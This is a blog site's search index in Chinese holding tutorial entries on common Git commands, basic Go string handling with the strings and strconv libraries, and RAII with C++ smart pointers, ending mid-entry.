<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Git常用命令</title>
      <link href="/2023/03/21/git-chang-yong-ming-ling/"/>
      <url>/2023/03/21/git-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="1-基础操作"><a href="#1-基础操作" class="headerlink" title="1.基础操作"></a>1.基础操作</h1><p><strong>克隆项目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs git">// 常规用法<br>git clone [url]<br>// 同时克隆子模块并更新子模块<br>git clone --recurse-submodules  &lt;url&gt;<br></code></pre></td></tr></table></figure><p><strong>.gitingore忽略文件</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 忽略根目录下的bin文件夹中的所有文件</span><br>/bin<br><span class="hljs-comment"># 忽略全部.c后缀的文件</span><br>*.c<br></code></pre></td></tr></table></figure><p><strong>提交暂存区</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs git">// 提交单个文件到暂存区<br>git add &lt;file&gt;<br>// 提交全部文件到暂存区<br>git add .<br></code></pre></td></tr></table></figure><p><strong>本地提交</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git commit -m &quot;提交说明&quot;<br></code></pre></td></tr></table></figure><p><strong>远程提交</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs git">// 查看当前的远程仓库<br>git remote -v<br>// 新增远程仓库<br>git remote add origin &lt;XXX.git&gt;<br>// 删除远程仓库<br>git remote rm &lt;仓库别名&gt;<br>// 提交到远程仓库<br>git push origin main<br></code></pre></td></tr></table></figure><h1 id="2-分支管理"><a href="#2-分支管理" class="headerlink" title="2.分支管理"></a>2.分支管理</h1><p><strong>查看当前分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git branch<br></code></pre></td></tr></table></figure><p><strong>新建分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git branch &lt;分支名&gt;<br></code></pre></td></tr></table></figure><p><strong>切换分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git checkout &lt;分支名&gt; <br></code></pre></td></tr></table></figure><p><strong>合并分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git merge &lt;待合并的分支名&gt;<br></code></pre></td></tr></table></figure><p><strong>删除分支</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git branch -d &lt;分支名&gt;<br></code></pre></td></tr></table></figure><h1 id="3-版本管理"><a href="#3-版本管理" class="headerlink" title="3.版本管理"></a>3.版本管理</h1><p><strong>提交历史</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs git">// 常规模式<br>git log<br>// 精简模式<br>git log --pretty=oneline<br>// 查看所有操作的历史<br>git reflog<br></code></pre></td></tr></table></figure><p><strong>为提交打标签</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git tag -a &lt;提交版本号&gt;<br></code></pre></td></tr></table></figure><p><strong>删除标签</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git tag -d &lt;标签名&gt;<br></code></pre></td></tr></table></figure><p><strong>回滚版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git reset --hard &lt;提交版本号&gt;<br></code></pre></td></tr></table></figure><p><strong>回滚指定文件</strong></p><p>需要在文件所在目录中执行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git reset --hard &lt;提交版本号&gt; filename<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础语法</title>
      <link href="/2023/02/22/golang-ji-chu-yu-fa/"/>
      <url>/2023/02/22/golang-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1.数据类型"></a>1.数据类型</h1><h2 id="1-1-字符串字面量"><a href="#1-1-字符串字面量" class="headerlink" title="1.1 字符串字面量"></a>1.1 字符串字面量</h2><h3 id="1-1-1-初始化"><a href="#1-1-1-初始化" class="headerlink" title="1.1.1 初始化"></a>1.1.1 初始化</h3><p><strong>和 C&#x2F;C++ 不一样，Golang 语言中的字符串是根据长度限定的，而非特殊的字符 \0。string 类型的 0 值是长度为 0 的字符串，即空字符串 “”。</strong></p><p>go中的字符串是UTF8编码的不可改变的字符序列，ASSCI码占用1字节，其他字符根据需要占用2~4字节，初始化方式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-string">&quot;HelloWorld&quot;</span><br>s2 := <span class="hljs-string">&quot;smile你好&quot;</span><br></code></pre></td></tr></table></figure><p>字符串字面值的两种写法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-string">&quot;Hello\nWorld!&quot;</span><span class="hljs-comment">// 支持解析转义字符</span><br>s2 := <span class="hljs-string">`Hello\n// 原样输出，支持换行</span><br><span class="hljs-string">       nick!`</span><br></code></pre></td></tr></table></figure><h3 id="1-1-2-获取长度"><a href="#1-1-2-获取长度" class="headerlink" title="1.1.2 获取长度"></a>1.1.2 获取长度</h3><p><strong>内置函数len：</strong>获取内存中字节数量，遇见中文字符长度计算会不准确</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-string">&quot;HelloWorld&quot;</span><br>s2 := <span class="hljs-string">&quot;smile你好&quot;</span> <br><br>fmt.Printf(<span class="hljs-string">&quot;s1: %d\n&quot;</span>, <span class="hljs-built_in">len</span>(s1))<br>fmt.Printf(<span class="hljs-string">&quot;s2: %d\n&quot;</span>, <span class="hljs-built_in">len</span>(s2))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>s1: <span class="hljs-number">10</span><br>s2: <span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p><strong>计算中文字符串长度：</strong>先将字符串转换为 [ ]rune 类型，再调用len函数即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-string">&quot;HelloWorld&quot;</span><br>s2 := <span class="hljs-string">&quot;smile你好&quot;</span> <br><br>fmt.Printf(<span class="hljs-string">&quot;s1: %d\n&quot;</span>, <span class="hljs-built_in">len</span>([]<span class="hljs-type">rune</span>(s1)))<br>fmt.Printf(<span class="hljs-string">&quot;s2: %d\n&quot;</span>, <span class="hljs-built_in">len</span>([]<span class="hljs-type">rune</span>(s2)))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>s1: <span class="hljs-number">10</span><br>s2: <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h3 id="1-1-3-截取内容"><a href="#1-1-3-截取内容" class="headerlink" title="1.1.3 截取内容"></a>1.1.3 截取内容</h3><p><strong>左含右不含，越界会异常</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;abcdef&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, s[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>bcd<br><br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, s[:<span class="hljs-number">4</span>])<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>abcd<br><br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, s[<span class="hljs-number">2</span>:])<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>cdef<br></code></pre></td></tr></table></figure><h3 id="1-1-4-遍历字符串"><a href="#1-1-4-遍历字符串" class="headerlink" title="1.1.4 遍历字符串"></a>1.1.4 遍历字符串</h3><p>字节序列遍历</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;abc你好&quot;</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(s); i++ &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;%c&quot;</span>, s[i])<br>&#125;<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>abcä½ å¥½<br></code></pre></td></tr></table></figure><p>字符序列遍历</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;abc你好&quot;</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> s &#123;<br>    fmt.Printf(<span class="hljs-string">&quot;%c&quot;</span>, v)<br>&#125; <br>&gt;&gt;&gt;&gt;&gt;&gt;<br>abc你好<br></code></pre></td></tr></table></figure><h3 id="1-1-5-修改内容"><a href="#1-1-5-修改内容" class="headerlink" title="1.1.5 修改内容"></a>1.1.5 修改内容</h3><p>字节修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;Hello 世界&quot;</span><br>b := []<span class="hljs-type">byte</span>(s) <span class="hljs-comment">// 转换为 []byte，数据被自动复制</span><br>b[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27;,&#x27;</span>     <span class="hljs-comment">// 把空格改为半角逗号</span><br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, s)<br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, b)<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>Hello 世界<br>Hello,世界<br></code></pre></td></tr></table></figure><p>字符修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;Hello 世界&quot;</span><br>b := []<span class="hljs-type">rune</span>(s) <span class="hljs-comment">// 转换为 []rune，数据被自动复制</span><br>b[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;中&#x27;</span><br>b[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27;国&#x27;</span><br>fmt.Println(s)<br>fmt.Println(<span class="hljs-type">string</span>(b))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>Hello 世界<br>Hello 中国<br></code></pre></td></tr></table></figure><h2 id="1-2-strings库"><a href="#1-2-strings库" class="headerlink" title="1.2 strings库"></a>1.2 strings库</h2><p>go语言内置字符串库，支持多种字符串操作。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 检查子串包含</span><br>s := <span class="hljs-string">&quot;A good tree bears good fruit&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;%t\n&quot;</span>, strings.Contains(s, <span class="hljs-string">&quot;tree&quot;</span>))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br><span class="hljs-literal">true</span><br><br><span class="hljs-comment">// 获取索引</span><br>fmt.Println(strings.Index(<span class="hljs-string">&quot;Hi I&#x27;m Nick, Hi&quot;</span>, <span class="hljs-string">&quot;Nick&quot;</span>))                <span class="hljs-comment">// 7</span><br>fmt.Println(strings.Index(<span class="hljs-string">&quot;Hi I&#x27;m Nick, Hi&quot;</span>, <span class="hljs-string">&quot;Hi&quot;</span>))                  <span class="hljs-comment">// 0</span><br>fmt.Println(strings.Index(<span class="hljs-string">&quot;Hi I&#x27;m Nick, Hi&quot;</span>, <span class="hljs-string">&quot;abc&quot;</span>))                 <span class="hljs-comment">// -1</span><br>fmt.Println(strings.LastIndex(<span class="hljs-string">&quot;Hi I&#x27;m Nick, Hi&quot;</span>, <span class="hljs-string">&quot;Hi&quot;</span>))              <span class="hljs-comment">// 13</span><br><br><span class="hljs-comment">// 替换字符串</span><br>fmt.Println(strings.Replace(<span class="hljs-string">&quot;你好世界&quot;</span>, <span class="hljs-string">&quot;世界&quot;</span>, <span class="hljs-string">&quot;地球&quot;</span>, <span class="hljs-number">1</span>))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>你好地球<br><br><span class="hljs-comment">// 大小写转换</span><br>s := <span class="hljs-string">&quot;A good tree bears good fruit&quot;</span><br>s1 := <span class="hljs-string">&quot;HOW ARE YOU?&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, strings.ToUpper(s))<br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, strings.ToLower(s1))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>A GOOD TREE BEARS GOOD FRUIT<br>how are you?<br><br><span class="hljs-comment">// 修剪</span><br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.Trim(<span class="hljs-string">&quot; Golang &quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.TrimLeft(<span class="hljs-string">&quot; Golang &quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.TrimRight(<span class="hljs-string">&quot; Golang &quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br><span class="hljs-string">&quot;Golang&quot;</span><br><span class="hljs-string">&quot;Golang &quot;</span><br><span class="hljs-string">&quot; Golang&quot;</span><br><br><span class="hljs-comment">// 分隔与拼接</span><br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.Split(<span class="hljs-string">&quot;a,b,c&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>))<br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.Split(<span class="hljs-string">&quot;a boy a girl a cat&quot;</span>, <span class="hljs-string">&quot;a &quot;</span>))<br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.Split(<span class="hljs-string">&quot;xyz&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br>[<span class="hljs-string">&quot;a&quot;</span> <span class="hljs-string">&quot;b&quot;</span> <span class="hljs-string">&quot;c&quot;</span>]<br>[<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;boy &quot;</span> <span class="hljs-string">&quot;girl &quot;</span> <span class="hljs-string">&quot;cat&quot;</span>]<br>[<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-string">&quot;z&quot;</span>]<br><br>fmt.Printf(<span class="hljs-string">&quot;%q\n&quot;</span>, strings.Join([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;boy&quot;</span>, <span class="hljs-string">&quot;girl&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>&#125;, <span class="hljs-string">&quot;;&quot;</span>))<br>&gt;&gt;&gt;&gt;&gt;&gt;<br><span class="hljs-string">&quot;boy;girl;cat&quot;</span><br></code></pre></td></tr></table></figure><h2 id="1-3-strconv库"><a href="#1-3-strconv库" class="headerlink" title="1.3 strconv库"></a>1.3 strconv库</h2><p>go语言内置字符串库，主要用于将字符串类型与其他类型进行转换。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">num, _ := strconv.Atoi(<span class="hljs-string">&quot;123&quot;</span>)<br>num += <span class="hljs-number">5</span><br>fmt.Printf(<span class="hljs-string">&quot;%d\n&quot;</span>, num)<br>&gt;&gt;&gt;&gt;&gt;&gt;<br><span class="hljs-number">128</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RAII与智能指针</title>
      <link href="/2022/12/21/raii-yu-zhi-neng-zhi-zhen/"/>
      <url>/2022/12/21/raii-yu-zhi-neng-zhi-zhen/</url>
      
        <content type="html"><![CDATA[<h1 id="1-RAII思想"><a href="#1-RAII思想" class="headerlink" title="1.RAII思想"></a>1.RAII思想</h1><p>RAII是C++内存管理的一种思想，资源获取视为初始化。使用对象封装资源的获取与释放操作，对象初始化时调用构造函数完成资源获取，对象离开作用域自动调用析构函数完成资源释放，避免了忘记调用销毁函数的情况，降低内存泄漏风险。如下例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLock</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">MyLock</span><span class="hljs-params">(T&amp; mutex)</span></span><br><span class="hljs-function">:_mutex(mutex) &#123;</span><br>_mutex.<span class="hljs-built_in">lock</span>();<br>&#125;<br>    ~<span class="hljs-built_in">MyLock</span>() &#123;<br>        _mutex.<span class="hljs-built_in">unlock</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这段代码可以保证初始化的时候加锁，生命周期结束后自动释放锁，同时天生异常安全，因为C++异常栈展开时会调用局部对象的析构函数。</p><h1 id="2-智能指针"><a href="#2-智能指针" class="headerlink" title="2.智能指针"></a>2.智能指针</h1><h2 id="2-1-基本介绍"><a href="#2-1-基本介绍" class="headerlink" title="2.1 基本介绍"></a>2.1 基本介绍</h2><p>智能指针就是采用RAII思想实现的资源管理模板类，由标准库提供，需要包含&lt;memory&gt;头文件。</p><table><thead><tr><th>名字</th><th>管理方式</th><th>特点</th></tr></thead><tbody><tr><td>std::unique_ptr<T></T></td><td>独享</td><td>某一时刻只能有一个对象占有资源；<br>不可以拷贝与赋值（会造成double free），但可以移动；<br>离开作用域立即释放资源；常与原始指针联用</td></tr><tr><td>std::shared_ptr<T></T></td><td>共享</td><td>支持多个对象共享资源；<br>内部维护引用计数，可以拷贝或赋值，会造成引用计数变化，会当计数为0时释放资源；<br>常于std::weak_ptr<T>联用</T></td></tr></tbody></table><h2 id="2-2-基本用法"><a href="#2-2-基本用法" class="headerlink" title="2.2 基本用法"></a>2.2 基本用法</h2><h3 id="2-2-1-unique-ptr"><a href="#2-2-1-unique-ptr" class="headerlink" title="2.2.1 unique_ptr"></a>2.2.1 unique_ptr</h3><p>初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Foo</span> &#123;<br>    <span class="hljs-built_in">Foo</span>() &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;Foo\n&quot;</span>; &#125;<br>    ~<span class="hljs-built_in">Foo</span>() &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;~Foo\n&quot;</span>; &#125;<br>&#125;;<br><br><span class="hljs-comment">// 最常用的初始化</span><br><span class="hljs-function">std::unique_ptr&lt;Foo&gt; <span class="hljs-title">p1</span><span class="hljs-params">(std::make_unique&lt;Foo&gt;())</span></span>;<br><br><span class="hljs-comment">// 绑定new指针</span><br><span class="hljs-function">std::unique_ptr&lt;Foo&gt; <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Foo())</span></span>;<br><br><span class="hljs-comment">// 绑定数组</span><br><span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">parr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>])</span></span>;<br><br><span class="hljs-comment">// 类删除器</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">D</span> &#123;<br>    <span class="hljs-built_in">D</span>() &#123;&#125;;<br>    <span class="hljs-built_in">D</span>(<span class="hljs-type">const</span> D&amp;) &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;D copy ctor\n&quot;</span>; &#125;<br>    <span class="hljs-built_in">D</span>(D&amp;) &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;D non-const copy ctor\n&quot;</span>;&#125;<br>    <span class="hljs-built_in">D</span>(D&amp;&amp;) &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;D move ctor \n&quot;</span>; &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(Foo* p)</span> <span class="hljs-type">const</span> </span>&#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;D is deleting a Foo\n&quot;</span>;<br>        <span class="hljs-keyword">delete</span> p;<br>    &#125;;<br>&#125;;<br><br><span class="hljs-function">std::unique_ptr&lt;Foo, D&gt; <span class="hljs-title">p3</span><span class="hljs-params">(std::make_unique&lt;Foo&gt;(), D())</span></span>;<span class="hljs-comment">// 此时发生D移动构造</span><br>D d;<br><span class="hljs-function">std::unique_ptr&lt;Foo, D&gt; <span class="hljs-title">p4</span><span class="hljs-params">(std::make_unique&lt;Foo&gt;(), d)</span></span>;<span class="hljs-comment">// 此时发生D拷贝构造</span><br><br><span class="hljs-comment">// 函数删除器</span><br><span class="hljs-keyword">auto</span> deleter = [](<span class="hljs-type">int</span>* ptr) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[deleter called.]&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">delete</span> ptr;<br>&#125;<br><br><span class="hljs-function">std::unique_ptr&lt;<span class="hljs-type">int</span>, <span class="hljs-title">decltype</span><span class="hljs-params">(deleter)</span>&gt; <span class="hljs-title">p5</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>, deleter)</span></span>;<span class="hljs-comment">// 使用lambda表达式</span><br></code></pre></td></tr></table></figure><p>手动释放</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::unique_ptr&lt;Foo&gt; <span class="hljs-title">p1</span><span class="hljs-params">(std::make_unique&lt;Foo&gt;())</span></span>;<br><br><span class="hljs-comment">// 移出控制权，但不真正销毁对象。之后get()返回nullptr</span><br><span class="hljs-keyword">auto</span> p = p1.<span class="hljs-built_in">release</span>();<br><br><span class="hljs-comment">// 销毁旧的，赋值新的</span><br>p1.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>());<br><span class="hljs-comment">// 移除控制权并销毁对象</span><br>p1.<span class="hljs-built_in">reset</span>(<span class="hljs-literal">nullptr</span>);<br><br><span class="hljs-comment">// 交换被管理的对象以及删除其</span><br><span class="hljs-function">std::unique_ptr&lt;Foo&gt; <span class="hljs-title">up1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Foo(<span class="hljs-number">1</span>))</span></span>;<br><span class="hljs-function">std::unique_ptr&lt;Foo&gt; <span class="hljs-title">up2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Foo(<span class="hljs-number">2</span>))</span></span>;<br>up1.<span class="hljs-built_in">swap</span>(up2)<br></code></pre></td></tr></table></figure><h3 id="2-2-2-shared-ptr"><a href="#2-2-2-shared-ptr" class="headerlink" title="2.2.2 shared_ptr"></a>2.2.2 shared_ptr</h3><p>初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Foo</span> &#123;<br>    <span class="hljs-built_in">Foo</span>() &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;Foo\n&quot;</span>; &#125;<br>    ~<span class="hljs-built_in">Foo</span>() &#123; std::cout &lt;&lt; <span class="hljs-string">&quot;~Foo\n&quot;</span>; &#125;<br>&#125;;<br><br><span class="hljs-comment">// 最常用的写法</span><br><span class="hljs-function">std::shared_ptr&lt;Foo&gt; <span class="hljs-title">p1</span><span class="hljs-params">(std::make_shared&lt;Foo&gt;())</span></span>;<br><br><span class="hljs-comment">// 绑定new指针</span><br><span class="hljs-function">std::shared_ptr&lt;Foo&gt; <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Foo())</span></span>;<br><br><span class="hljs-comment">// 